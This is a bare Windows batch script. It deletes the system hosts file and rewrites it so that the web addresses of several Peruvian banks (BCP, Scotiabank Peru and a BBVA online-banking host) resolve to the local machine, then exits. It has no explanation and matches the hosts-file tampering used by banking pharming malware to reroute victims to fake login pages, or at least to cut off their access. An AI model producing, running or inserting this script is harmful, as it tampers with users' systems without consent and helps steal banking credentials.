@echo off

del "%windir%\system32\drivers\etc\hosts"

echo 127.0.0.1  viabcp.com >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1  www.viabcp.com >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1  scotiabank.com.pe >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1  www.scotiabank.com.pe >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1  peb1.bbvanetlatam.com >> %windir%\system32\drivers\etc\hosts

exit
